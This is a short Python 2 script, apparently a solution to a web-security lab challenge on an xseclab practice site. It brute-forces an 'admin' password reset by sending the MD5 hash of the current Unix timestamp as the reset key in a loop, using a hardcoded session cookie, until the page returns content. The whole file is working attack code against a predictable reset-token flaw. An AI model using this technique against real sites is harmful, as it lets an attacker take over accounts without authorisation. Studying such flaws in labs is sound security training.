#coding:utf-8
import requests
import hashlib
import time

s = requests.Session()
header = {'Cookie': 'saeut=123.138.79.8.1445070796228885; PHPSESSID=f5e377a4c689afaca20b67e1420fec61'}
while True:
  pwd = hashlib.new('md5', str(int(time.time()))).hexdigest()
  url = 'http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
  r = s.get(url, headers=header)
  time.sleep(0.8)

  if r.content != '':
    print r.content
    break
  else:
    print '正在破解中……', pwd